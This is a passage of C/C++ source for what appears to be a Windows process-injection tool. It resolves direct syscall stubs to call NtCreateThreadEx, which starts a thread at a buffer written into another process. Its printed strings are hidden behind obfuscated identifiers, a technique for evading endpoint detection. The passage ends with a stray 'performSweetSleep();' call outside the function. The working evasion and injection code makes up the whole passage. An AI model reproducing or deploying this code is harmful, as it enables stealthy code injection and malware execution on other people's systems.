    //     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //     if (processHandle == NULL) {
    //         printf("[-] Failed to open the process with PID: %lu.\n", pid);
    //         return -1; // or appropriate error handling
    //     }
    //     printf("[+] Process with PID %lu opened.\n", pid);
    // }


    HANDLE threadHandle;

    if (step == -1 || step == 3) {

        if(step == 3) {
            printf(mxt_9999AT_R_f_pw2izcYVckYZvenu);
        }   

        myNtCreateThreadEx NtCreateThread = (myNtCreateThreadEx)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory
        // HANDLE threadHandle;


        if (GetSyscallStub(mxt_NtCrea_M_IIj3t2ah4H31Zyrenu, exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf(mxt_9999Me_S_qJdIsyWVLHB56IVenu, (void*)NtCreateThread);
            status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
            if (status != STATUS_SUCCESS) {
                printf(mxt_9999Nt_R_XQP4tcEPIuh3TSGenu);
                return -1;
            }
            printf(mxt_9999Nt_S_u0YMWbaGTkZOVlKenu);
            printf(mxt_9999Pr_M_Re9rruS_eV_B4Ykenu, (SIZE_T)processHandle);
        } else {
            printf(mxt_9999Fa_S_JRbmVpnJ3DX1dWLenu);
        }

        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
        WaitForSingleObject(threadHandle, INFINITE);
    }
    ///*********************************************************************************

    if (step == -1 || step == 3) {

        // close handle:
        myNtClose NtCloseHandle = (myNtClose)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


        if (GetSyscallStub(mxt_NtClos_M_j8ttTYNX0gfFq6Eenu, exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf(mxt_9999Me_R_jMbA174m441g2jTenu, (void*)NtCloseHandle);
            status = NtCloseHandle(threadHandle);
            if (status != STATUS_SUCCESS) {
                printf(mxt_9999Nt_M_r17pJCDNXB4YCKQenu);
                return -1;
            }
            printf(mxt_9999Nt_S_c1zXzYLJT6sq2wAenu);
            printf(mxt_9999th_M_b1rTJqNUG8Cihr9enu, (SIZE_T)threadHandle);
        } else {
            printf(mxt_9999Fa_M_bww5Rpqn_yIu4n_enu);
        }
    }

    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf(mxt_9999Su_M_2Uk8RfcFx8jyd4aenu);
    Sleep(155000);
    CloseHandle(processHandle);


    return 0;




}performSweetSleep();

